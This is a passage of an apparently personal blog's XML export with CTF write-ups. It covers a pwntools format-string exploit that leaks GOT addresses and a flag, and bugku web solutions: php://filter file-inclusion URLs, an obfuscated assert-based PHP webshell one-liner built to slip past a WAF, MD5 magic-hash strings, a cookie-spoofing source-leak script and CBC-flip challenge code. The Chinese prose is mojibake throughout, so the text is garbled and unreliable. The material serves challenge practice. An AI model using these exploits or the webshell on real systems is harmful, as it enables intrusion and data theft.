æ•ˆå‘¢ï¼Ÿ æˆ‘è‡ªå·±å°è¯•çš„ç»“æžœæ˜¯ç›´æŽ¥é€€å‡ºäº†ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰æ‰“å°å‡ºæ¥emm è¿™æ—¶å€™å¦‚æžœæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼Œ æ¯”å¦‚gotè¡¨ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€è¿™å°±å¾ˆç¥žå¥‡äº† expå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627from pwn import *import timesh = process('./leakMemory')context.log_level = 'debug'leakmemory = ELF('./leakMemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadpayload1 = '%4$s' #è¿™ä¸¤ä¸ªpayloadæ˜¯è‡ªå·±æµ‹è¯•çš„payload2 = 'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'gdb.attach(sh)#time.sleep(1)sh.sendline(payload)sh.recvuntil('%4$s\n')#print sh.recvuntil('%4$s\n')#print '\n'print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() æˆ‘ä»¬è¿è¡Œè¿™ä¸ªexp åœ¨pwndbgä¸­ä¸‹æ–­ç‚¹ è¿è¡Œåˆ°ç¬¬äºŒä¸ªprintfçš„æ—¶å€™ 123456789â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp 0xffa3bdfc â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffa3be00 â€”â–¸ 0xffa3be10 â€”â–¸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) â€”â–¸ 0xf7df2bb0 (__isoc99_scanf) â—‚â€” push ebp... â†“03:000câ”‚ 0xffa3be08 â€”â–¸ 0xf7f85410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffa3be0c â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffa3be10 â€”â–¸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) â€”â–¸ 0xf7df2bb0 (__isoc99_scanf) â—‚â€” push ebp06:0018â”‚ 0xffa3be14 â—‚â€” '%4$s'07:001câ”‚ 0xffa3be18 â€”â–¸ 0xf7fb3900 (catch_hook) â—‚â€” 0x0 å¦ä¸€è¾¹ 123456789[+] Waiting for debugger: Done[DEBUG] Sent 0x9 bytes: 00000000 14 a0 04 08 25 34 24 73 0a â”‚Â·Â·Â·Â·â”‚%4$sâ”‚Â·â”‚ 00000009[DEBUG] Received 0x24 bytes: 00000000 30 30 30 30 30 30 30 31 2e 32 32 32 32 32 32 32 â”‚0000â”‚0001â”‚.222â”‚2222â”‚ 00000010 32 2e 66 66 66 66 66 66 66 66 2e 14 a0 04 08 25 â”‚2.ffâ”‚ffffâ”‚ff.Â·â”‚Â·Â·Â·%â”‚ 00000020 34 24 73 0a â”‚4$sÂ·â”‚â”‚ 00000024 continue 1234567[DEBUG] Received 0x8 bytes: 00000000 14 a0 04 08 b0 2b df f7 â”‚Â·Â·Â·Â·â”‚Â·+Â·Â·â”‚â”‚ 000000080xf7df2bb0[*] Switching to interactive mode[*] Process './leakMemory' stopped with exit code 0 (pid 5064)[*] Got EOF while reading in interactive è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¾—åˆ°äº†scanfå‡½æ•°çš„åœ°å€äº† ok è¿˜æœ‰å‡ ä¸ªåœ°æ–¹æ²¡å¼„æ˜Žç™½ä¹‹åŽå†å†™ ç¡®å®šå¯æŽ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²ä½ç½®çš„æ–¹æ³• æ—¢ç„¶ç¨‹åºæ˜¯æœ‰æ¼æ´žçš„ï¼Œæˆ‘ä»¬å°±å¿…é¡»çŸ¥é“å¯è¢«æŽ§åˆ¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œè¿™æ—¶å€™å¤§è‡´æœ‰ä»¥ä¸‹å‡ ç§å§¿åŠ¿ æž„é€ ç±»ä¼¼ [tag]%p%p%p%p%p%p...è¿™æ ·çš„å‚æ•° Pwngdbä¸­æœ‰ä¸€ä¸ªå«åšfmargå¯ä»¥ç”¨æ¥èŽ·å–æŒ‡å®šåœ°å€åˆ°åº•æ˜¯ç¬¬å‡ ä¸ªå‚æ•° ä¸æ˜¯å¾ˆç†è§£ç¬¬ä¸€ç§æ–¹æ³•åŽŸç†ï¼Œä½†æ˜¯ç¬¬äºŒç§æ–¹æ³•æ¯”è¾ƒå¥½ç”¨ ä¸è¿‡æˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š IDAä¸­çš„Cä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+3h] [rbp-3Dh] signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+4h] [rbp-3Ch] char *format; // [rsp+8h] [rbp-38h] _IO_FILE *fp; // [rsp+10h] [rbp-30h] char *v9; // [rsp+18h] [rbp-28h] char v10[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); fp = fopen("flag.txt", "r"); for ( i = 0; i &lt;= 21; ++i ) v10[i] = _IO_getc(fp); fclose(fp); v9 = v10; puts("what's the flag"); fflush(_bss_start); format = 0LL; __isoc99_scanf("%ms", &amp;format); for ( j = 0; j &lt;= 21; ++j ) &#123; v4 = format[j]; if ( !v4 || v10[j] != v4 ) &#123; puts("You answered:"); printf(format); puts("\nBut that was totally wrong lol get rekt"); fflush(_bss_start); return 0; &#125; &#125; printf("That's right, the flag is %s\n", v9); fflush(_bss_start); return 0;&#125; æ˜¾ç„¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž æˆ‘ä»¬éœ€è¦åœ¨printfå‡½æ•°å¤„ä¸‹æ–­ç‚¹ ç„¶åŽéšä¾¿è¾“å…¥ä¸€äº›æ•°å­—: 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x7ffff7a48e6c &lt;__fprintf+172&gt;: call 0x7ffff7b18c80 &lt;__stack_chk_fail&gt; 0x7ffff7a48e71: nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7a48e7b: nop DWORD PTR [rax+rax*1+0x0]=&gt; 0x7ffff7a48e80 &lt;__printf&gt;: sub rsp,0xd8 0x7ffff7a48e87 &lt;__printf+7&gt;: test al,al 0x7ffff7a48e89 &lt;__printf+9&gt;: mov QWORD PTR [rsp+0x28],rsi 0x7ffff7a48e8e &lt;__printf+14&gt;: mov QWORD PTR [rsp+0x30],rdx 0x7ffff7a48e93 &lt;__printf+19&gt;: mov QWORD PTR [rsp+0x38],rcx[------------------------------------stack-------------------------------------]0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;: mov edi,0x4009b8)0008| 0x7fffffffde10 --&gt; 0x61000001 0016| 0x7fffffffde18 --&gt; 0x602cb0 ('a' &lt;repeats 16 times&gt;)0024| 0x7fffffffde20 --&gt; 0x602260 --&gt; 0x0 0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0040| 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0048| 0x7fffffffde38 ("111111111&#125;\n\377\377\377")0056| 0x7fffffffde40 --&gt; 0xffffff0a7d31 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, __printf (format=0x602cb0 'a' &lt;repeats 16 times&gt;) at printf.c:2828 printf.c: No such file or directory. è¿™æ—¶å€™å¯ä»¥çœ‹åˆ°flagäº†ï¼Œæ³¨æ„æˆ‘ä»¬æ˜¯åœ¨æœ¬åœ°è°ƒè¯•ï¼Œè°ƒè¯•çš„æ—¶å€™å½“ç„¶å¯ä»¥çœ‹åˆ°flagï¼Œä¸€èˆ¬çš„pwné¢˜éƒ½æ˜¯è¦è¿œç¨‹è¿žæŽ¥çš„ å¦‚æžœæˆ‘ä»¬è¦æ³„éœ²flagçš„å€¼ï¼Œå°±éœ€è¦æž„é€ %n$sè¿™æ ·çš„ä¼ è¿›åŽ»ã€‚æ‰€ä»¥èŽ·å–å‚æ•°çš„ä½ç½®å¾ˆå…³é”® 12gdb-peda$ fmtarg 0x7fffffffde28The index of format argument : 10 ("\%9$p") é€šè¿‡Pwngdbå°±å¯ä»¥æŸ¥çœ‹å‚æ•°çš„ä½ç½®äº† è¿™æ—¶å€™è¿è¡Œ 12345678abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan % ./goodluck what's the flag%9$sYou answered:flag&#123;111111111111&#125;ï¿½ï¿½ï¿½But that was totally wrong lol get rekt å°±å¾—åˆ°äº†flag (è¿™é‡Œå€¼å¾—æ³¨æ„çš„å°±æ˜¯ï¼Œ64ä½ç³»ç»Ÿå’Œ32ä½ç³»ç»Ÿä¼ å‚æ˜¯ä¸ä¸€æ ·çš„)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku webé¢˜ç›®çš„wp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[welcome to bugkuctf ctrl + UæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œ å¦‚æžœæœ‰ $userä¸” file_get_contents($user, 'r') çš„ å€¼æ˜¯ æŒ‡å®šçš„å­—ç¬¦ä¸²ã€‚ å°±ä¼š include $file çš„å†…å®¹ ã€‚ å¹¶ä¸”æç¤ºæ˜¯ hint.phpè¿™ä¸ªæ–‡ä»¶ è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªæ€Žä¹ˆæŠŠ get æ–¹æ³•ä¼ å…¥çš„å‚æ•°ä½œä¸ºä¸€ä¸ªæ–‡ä»¶æ‰“å¼€ã€‚ phpä¼ªåè®® è¿™é‡Œç”¨åˆ°äº† php://input ä½†æ˜¯ã€‚ã€‚ è¿™å°±è¦ç”¨åˆ°ç¬¬äºŒä¸ªä¼ªåè®®ï¼š php://filter æˆ‘é‚£æ ·ä¼ é€’å‚æ•°ä¼šæŠ¥é”™ï¼Œ include($file) åªæ˜¯æŠŠ $file è¿™ä¸ªå˜é‡å½“ä½œæ–‡ä»¶ååŒ…æ‹¬è¿›åŽ»äº†ã€‚ å°±æ˜¯å«åœ¨æºä»£ç é‡Œï¼Œ ä¸æ˜¯ç®€å•åœ°æž„é€ ä¸€ä¸ªå‚æ•°å°±èƒ½è¾¾åˆ°çš„ã€‚ è¿™å°±æ˜¯ä¸€ä¸ªæ³„éœ²äº†æºç çš„æ¼æ´žäº†ã€‚ æœ€åŽæž„é€ çš„URLå¦‚ä¸‹ï¼š http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php æƒŠå¹ã€‚ base64 è§£å¯†ä¹‹åŽçš„æºä»£ç ã€‚ 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; ä»£ç é‡Œé¢æž„é€ äº†ä¸€ä¸ªç±»ã€‚ å…¬æœ‰å˜é‡æ˜¯ $file ç»§ç»­çœ‹ä¸€ä¸‹ index.php çš„æºä»£ç  123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "Ã¤Â¸ÂÃ¨ÂƒÂ½Ã§ÂŽÂ°Ã¥ÂœÂ¨Ã¥Â°Â±Ã§Â»Â™Ã¤Â½ flagÃ¥Â“Â¦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; æœ‰å‡ ä¸ªåœ°æ–¹æš‚æ—¶å†™ä¸åˆ°ä½ï¼Œ å…ˆåˆ°è¿™é‡Œå¥½äº†ã€‚ è¿‡ç‹—ä¸€å¥è¯ å¾ˆè’™ 1234&lt;?php $poc="a#s#s#e#r#t";$poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; ä¸Šé¢æ˜¯é¢˜ç›®æç¤ºçš„è¿‡ç‹—ä¸€å¥è¯ä»£ç ã€‚ ç„¶åŽ...åŽé¢çš„ä¸ä¼šäº† å­—ç¬¦ï¼Œæ­£åˆ™ï¼Ÿ å‰å¥³å‹ ä¸€é“å¾ˆæœ‰è¶£çš„é¢˜ç›®ï¼Œ å°±ä¸è¯´é¢˜ç›®äº†ï¼Œ ç›´æŽ¥æ”¾æˆ‘çš„æµ‹è¯•ä»£ç  123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å‘çŽ°getè¿˜èƒ½ä¼ é€’æ•°ç»„ï¼ˆä¸è¿‡å½“ç„¶æ˜¯ä¸€å †çš„é”™è¯¯ï¼‰ MD5 collision è¿˜ä¸å¤ªæ¸…æ¥šMD5 ç¢°æ’žæ˜¯å•¥ï¼Œ ä»¥åŽè¡¥å‘ payload 120.24.86.145:9009/md5.php?a=s878926199a å¸¸ç”¨çš„MD5ç¢°æ’ž 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 ç§‹åå±±è€å¸æœº 123456789101112&lt;head&gt;&lt;title&gt;ä¸‹é¢çš„è¡¨è¾¾å¼çš„å€¼æ˜¯ç§‹åå±±çš„è½¦é€Ÿ&lt;/title&gt;&lt;meta charset="UTF-8"&gt;&lt;/head&gt;&lt;p&gt;äº²è¯·åœ¨2så†…è®¡ç®—è€å¸æœºçš„è½¦é€Ÿæ˜¯å¤šå°‘&lt;/p&gt;&lt;div&gt;1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;&lt;/div&gt;&lt;style&gt;div,p&#123;text-align: center;margin: 0 auto;&#125;&lt;/style&gt; ä¸¤ç§’ä¹‹å†…è®¡ç®—å‡ºå¼å­ä¸­çš„å€¼ï¼Œ å†æäº¤ èœé¸¡è¿˜ä¸å¤ªä¼šå†™è„šæœ¬ å‚è€ƒäº†dalaoä»¬çš„ä»£ç  123456789import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()source = s.get(url)expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()result = eval(expression)post = &#123;'value': result&#125;print(s.post(url, data = post).text) ä¸è¿‡è¿˜æ˜¯æ²¡æžå‡ºæ¥ã€‚ å¤ä¹ ä¸€ä¸‹requestsåº“ 1234567import requests#æž„é€ requestså¯¹è±¡s = requests.get(url)s.post(url, )#å·®ä¸å¤šå°±è¿™äº›äº† cookiesæ¬ºéª— ç„¶è€Œæ³¨æ„åˆ°URLä¸­çš„lineå’Œfileæ—¶å°±èƒ½åšå‡ºæ¥äº†ã€‚ 1234567#ç”¨è„šæœ¬æŠŠä»£ç è·‘å‡ºæ¥import requestsa=30for i in range(a): url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" s=requests.get(url) print s.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //çœ‹è¿™é‡Œ $file_list[2]='keys.php'; &#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; æž„é€ cookieå°±è¡Œå•¦ ï¼ˆç„¶è€Œæ²¡æžå‡ºflagæ¥ï¼‰ login4 CBCå­—èŠ‚ç¿»è½¬æ”»å‡» æ”¾ä¸€å¼ ç»å…¸çš„å›¾ æ®å¸ˆå‚…ä»¬çš„wpè¯´æ˜¯æœ‰ä¸€ä¸ªindex.php.swpæ–‡ä»¶å­˜åœ¨ã€‚ ç„¶è€Œæ²¡æ‰¾åˆ°ï¼Œ å…ˆæŠŠå¸ˆå‚…ä»¬æ‰¾åˆ°çš„æºç æ”¾ä¸Šæ¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv()&#123; $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("&lt;p&gt;base64_decode('".base64_encode($plain)."') can't unserialize&lt;/p&gt;"); $_SESSION['username'] = $info['username']; &#125;else&#123; die("ERROR!"); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION["username"]==='admin')&#123; echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; &#125;else&#123; echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; &#125; echo '&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;';&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin')&#123; exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); &#125;else&#123; info = array('username'=&gt;username,'password'=&gt;password); login(info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION["username"]))&#123; check_login(); show_homepage(); &#125;else&#123; echo '&lt;body class="login-body"&gt; &lt;div id="wrapper"&gt; &lt;div class="user-icon"&gt;&lt;/div&gt; &lt;div class="pass-icon"&gt;&lt;/div&gt; &lt;form name="login-form" class="login-form" action="" method="post"&gt; &lt;div class="header"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class="content"&gt; &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt; &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt; &lt;/div&gt; &lt;div class="footer"&gt; &lt;input type="submit" name="submit" value="Login" class="button" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; &#125;&#125;?&gt;&lt;/html&gt; å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ æ ¹æ®ä»¥å‰åšé¢˜çš„ç»éªŒï¼Œ å¤‡ä»½å°±æ˜¯åœ¨æç¤ºä½  å­˜åœ¨bakæ–‡ä»¶ æ‰€ä»¥ç›´æŽ¥è¾“å…¥URLä¸º http://123.206.87.240:8002/web16/index.php.bak ç„¶åŽä¸‹è½½æ–‡ä»¶ ä»£ç ï¼š 1234567891011121314&lt;?phpinclude_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."å–å¾—flag";&#125;?&gt; åšä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œ è¿˜æ˜¯ä¸»è¦é è‡ªå·±å°è¯•ã€‚ 1234567891011121314151617181920212223242526&lt;?phperror_reporting(0);$str = strstr($_SERVER['REQUEST_URI'], '?');echo "$str"."&lt;/br&gt;";$str = substr($str, 1);echo "$str"."&lt;/br&gt;";$str = str_replace('key','', $str);echo "$str"."&lt;/br&gt;";parse_str($str);echo "$key1"."&lt;/br&gt;";echo md5($key1);echo "&lt;/br&gt;";echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2) echo 'flag';?&gt; ä¸Šé¢æ˜¯æˆ‘ç”¨æ¥æµ‹è¯•çš„ä»£ç  æž„é€ URLä¸º http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2 è¾“å‡ºäº†è¿™äº›ï¼š 123456?kkeyey1=1&amp;kkeyey2=2kkeyey1=1&amp;kkeyey2=2key1=1&amp;key2=21c4ca4238a0b923820dcc509a6f75849bc81e728d9d4c2f636f067f89cc14862c ä¹‹å‰è¿˜å¾ˆç–‘æƒ‘ä¸ºä»€ä¹ˆæ²¡æœ‰getéƒ½èƒ½å¾—åˆ°å˜é‡ï¼Œ åŽŸæ¥æ˜¯parse_strè¿™ä¸ªå‡½æ•°åœ¨èµ·ä½œç”¨ã€‚ OKï¼Œ çŽ°åœ¨å°±æ˜¯è¡¨æ¼”çš„æ—¶é—´äº†ã€‚ å‚è€ƒèµ„æ–™ https://blog.csdn.net/wy_97/article/details/77431111 https://www.cnblogs.com/Pinging/p/8278168.html https://blog.csdn.net/qq_19861715/article/details/79384018 https://blog.csdn.net/qq_39629343/article/details/80696263 ç§‹åå±±è€å¸æœº cookieæ¬ºéª— CBCå­—èŠ‚ç¿»è½¬æ”»å‡» python requestsåº“å­¦ä¹ ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
